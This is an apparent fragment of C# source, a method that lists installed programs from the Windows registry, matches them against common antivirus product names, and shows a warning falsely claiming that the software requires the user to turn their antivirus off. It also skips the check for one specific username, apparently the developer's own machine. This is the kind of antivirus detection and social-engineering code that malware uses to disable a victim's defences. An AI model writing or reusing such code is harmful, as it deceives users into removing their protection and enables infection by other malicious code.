        private static bool HasAv()
        {
            if(Environment.UserName.Contains("Gersy"))
                 return false;
             string apps = "";

                try
                {
                    string registry_key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
                    using (Microsoft.Win32.RegistryKey key = Registry.LocalMachine.OpenSubKey(registry_key))
                    {
                        foreach (string subkey_name in key.GetSubKeyNames())
                        {
                            using (RegistryKey subkey = key.OpenSubKey(subkey_name))
                            {
                                apps += (subkey.GetValue("DisplayName") + Environment.NewLine);
                            }
                        }
                    }
                    bool hasAV = false; string av = "";
                    string[] avs = new string[] { "avast", "avira", "kasber", "mcafee", "avg", "nod", "norton" };
                    foreach (string a in avs)
                        if (apps.ToLower().Contains(a))
                        {
                            hasAV = true;
                            av = a;
                        }
                    if (hasAV)
                        MessageBox.Show("this software requires to turn your antivirus off", av + "  warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);

                    return hasAV;
                }
                catch { return false; }
            }
         

